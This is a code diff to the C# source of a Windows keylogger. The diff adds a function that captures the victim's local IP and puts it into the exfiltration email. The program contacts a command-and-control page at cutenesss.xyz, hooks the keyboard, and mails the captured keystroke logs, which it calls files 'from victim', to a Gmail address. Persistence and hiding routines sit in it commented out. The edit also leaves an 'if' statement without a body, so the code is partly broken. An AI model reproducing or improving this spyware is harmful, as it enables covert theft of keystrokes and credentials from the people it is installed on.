@@ -11,8 +11,7 @@ using System.Net;
 using System.Net.Mail;
 using Microsoft.Win32;
 using System.Windows.Input;
-
-
+using System.Net.Sockets;
 
 namespace Karios
 {
@@ -31,25 +30,29 @@ namespace Karios
 
             //start C&C func
 
-            WebClient wc = new WebClient();
-            string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
-            if (!webData.ToUpperInvariant().Contains("GoLogSomeKeys"))
+            using (WebClient wc = new WebClient())
             {
-                // Hide the window
-                //ShowWindow(handle, SW_HIDE);
-                // Persitance feature
-                //Duplicate();
-                // Run on startup
-                //SetStartup();
-                // Start Applicatiom
-                _hookID = SetHook(_proc);
-                Application.Run();
-                UnhookWindowsHookEx(_hookID);
+                try
+                {
+                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
+                    if (!webData.ToUpperInvariant().Contains("online"))
+                    
+
+                    // Hide the window
+                    //ShowWindow(handle, SW_HIDE);
+                    // Persitance feature
+                    //Duplicate();
+                    // Run on startup
+                    //SetStartup();
+                    // Start Applicatiom
+                    _hookID = SetHook(_proc);
+                    Application.Run();
+                    UnhookWindowsHookEx(_hookID);
+                }
+                catch { }
             }
-            else
-            {
-                Console.WriteLine("Dosent work!");
-            }
+
+
 
         }
             private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -97,7 +100,7 @@ namespace Karios
                         mail.From = new MailAddress("GINGIRULES@gmail.com");
                         mail.To.Add("GINGIRULES@gmail.com");
                         mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                        mail.Body = "New kelogging file from victim, finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                        mail.Body = "New kelogging file from victim " + LocalIP() + ", finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
 
                         Attachment attachment;
                         attachment = new Attachment(pathToLog);
@@ -158,6 +161,26 @@ namespace Karios
 
             }
             */
+
+            public static string LocalIP()
+            {
+                string localIP;
+                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
+                {
+                try
+                {
+                    socket.Connect("8.8.8.8", 65530);
+                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
+                    localIP = endPoint.Address.ToString();
+                    return localIP;
+                }
+                finally
+                {
+                    //do something
+                }
+            }
+             
+        }
 
             [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
             private static extern IntPtr SetWindowsHookEx(int idHook,
